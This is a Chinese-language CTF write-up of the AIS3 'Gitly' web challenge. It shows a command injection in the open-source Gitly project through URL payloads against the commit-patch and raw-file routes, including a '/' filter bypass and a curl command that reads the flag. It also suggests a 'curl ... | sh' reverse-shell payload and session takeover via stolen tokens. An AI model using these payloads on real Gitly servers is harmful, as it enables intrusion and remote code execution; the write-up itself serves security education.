# Gitly

* Category: Web
* Score: 500/500
* Solves: 5/247

## Description

[Gitly](https://github.com/vlang/gitly), a Light and fast GitHub/GitLab alternative written in V.

> Q. Am I supposed to find a 0day in the Gitly project?
> 
> A. Yes.

## Overview

目標很明顯是要找出 Gitly 的 0day，從 Dockerfile 來看可知一定要拿到 shell 才行。另外是 Dockerfile 還告訴你有個已知的 public repo 在 `/admin/gitly` 這個 path 底下。

## Solution

> 註: 寫這篇 writeup 時 Gitly 的最新 commit 是 [d0e1f3ad2fa3d76306a3de11642f5ff50e9e9ede](https://github.com/vlang/gitly/commit/d0e1f3ad2fa3d76306a3de11642f5ff50e9e9ede)

隨便點幾個檔案出來觀察可以發現 `*_routes.v` 的檔案裡面都定義了 http route 的 handler，例如以 `commit_routes.v` 來說可以看到[這兩行](https://github.com/vlang/gitly/blob/d0e1f3ad2fa3d76306a3de11642f5ff50e9e9ede/src/commit_routes.v#L8):

```v
['/api/v1/:user/:repo_name/:branch_name/commits/count']
fn (mut app App) handle_commits_count(username string, repo_name string, branch_name string) vweb.Result {
```

這代表 `/api/v1/a/b/c/commits/count` 的 request 會呼叫 `handle_commits_count("a", "b", "c")` 的意思。

之後就一個一個 route 往下翻看看哪個比較簡單也比較有機會打。例如我預期解找的是 [`/:username/:repo_name/commit/:hash`](https://github.com/vlang/gitly/blob/d0e1f3ad2fa3d76306a3de11642f5ff50e9e9ede/src/commit_routes.v#L79)。

它在 `hash.ends_with('.patch')` 的情況下會呼叫 `repo.get_commit_patch(commit_hash)`，而 `get_commit_patch` 的實作是[這樣](https://github.com/vlang/gitly/blob/d0e1f3ad2fa3d76306a3de11642f5ff50e9e9ede/src/repo_service.v#L658-L666)的:

```v
fn (r Repo) get_commit_patch(commit_hash string) ?string {
	patch := r.git('format-patch --stdout -1 ${commit_hash}')

	if patch == '' {
		return none
	}

	return patch
}
```

顯然有個 command injection，所以這邊有很多方法可以拿到 shell，不過因為是在 url 中所以都要 encode 一些特殊字元。

例如 `/admin/gitly/commit/%7Cid%20%23.patch` 可以用 pipe 執行 `id`，但 `/` 因為會被 url 參數分隔的原因所以 `/admin/gitly/commit/%7C%2freadflag%20%23.patch` 是沒用的。這邊可以用 `${PWD:0:1}readflag` 之類的方法繞過:

```bash
> curl -g 'http://chals1.ais3.org:25565/admin/gitly/commit/|${PWD:0:1}readflag%20%23.patch'
AIS3{so_many_bugs_so_easy_to_rce}
```

當然這也不是唯一的方法，你也可以用 `` ` `` (backtick) 字元裡面湊個 `curl ... | sh` 的 payload 然後用 reverse shell 也行。

另一個很多人都有用到的 payload: `/admin/gitly/raw/master/README.md%7C/readflag` ([source](https://github.com/vlang/gitly/blob/d0e1f3ad2fa3d76306a3de11642f5ff50e9e9ede/src/repo_routes.v#L530), 這個不用 escape `/` 很方便)

還有個方法是從給予的 `gitly.sqlite` 中 `select * from Token` 挖出 token，然後改 cookie `token=...` 就能變成登入狀態了。此時就能碰一些高權限的 api 了，但它也是一堆 command injection 所以方法也是差不多 XD。

例如 [`POST /new`](https://github.com/vlang/gitly/blob/d0e1f3ad2fa3d76306a3de11642f5ff50e9e9ede/src/repo_routes.v#L189) 可以提供 `clone_url`，讓它回傳 `service=git-upload-pack` 就能通過 `check_git_repo_url` 的檢查，之後 `new_repo.clone()` 底下又有一個 [command injection](https://github.com/vlang/gitly/blob/d0e1f3ad2fa3d76306a3de11642f5ff50e9e9ede/src/repo_service.v#L730)，所以一樣能拿到 shell。
